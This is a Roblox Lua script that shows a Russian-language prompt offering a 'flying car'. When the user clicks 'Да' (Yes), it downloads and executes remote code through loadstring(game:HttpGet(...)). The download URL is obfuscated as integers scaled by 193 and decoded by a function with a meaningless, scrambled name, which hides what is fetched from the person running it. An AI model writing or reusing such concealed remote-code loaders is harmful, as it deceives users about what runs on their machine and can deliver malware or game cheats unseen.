function isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/193)end return res end 



local function callback(Text)
    if Text == "Да" then
        loadstring(game:HttpGet(isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO({20072,22388,22388,21616,22195,11194,9071,9071,22002,18721,22967,8878,19879,20265,22388,20072,22581,18914,22581,22195,19493,22002,19107,21423,21230,22388,19493,21230,22388,8878,19107,21423,21037,9071,16019,15440,16212,16791,21423,21230,19300,19493,22002,22195,20072,18721,19493,22967,9071,15826,21423,18914,20844,21423,23160,13896,18721,19107,20651,19493,22002,9071,22002,19493,19686,22195,9071,20072,19493,18721,19300,22195,9071,21037,18721,20265,21230,9071,16598,19493,19107,20072,20265,20844,19493,16019,20072,18721,20265,22388,18721,21230}, true)))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Внимание!",
            Text = "Спасибо за внимание! 🐱",
            Icon = "",
            Duration = 10
})

    elseif Text == "Нет" then
        game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Очень жаль!:(",
Text = "Тун тун тун...", 
Duration = 2
})
    end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
    Title = "Запускать полёт на машине?",
    Text = "Летающая машина, вау..",
    Icon = "",
    Duration = 10,
    Button1 = "Да",
    Button2 = "Нет",
    Callback = NotificationBindable,

})





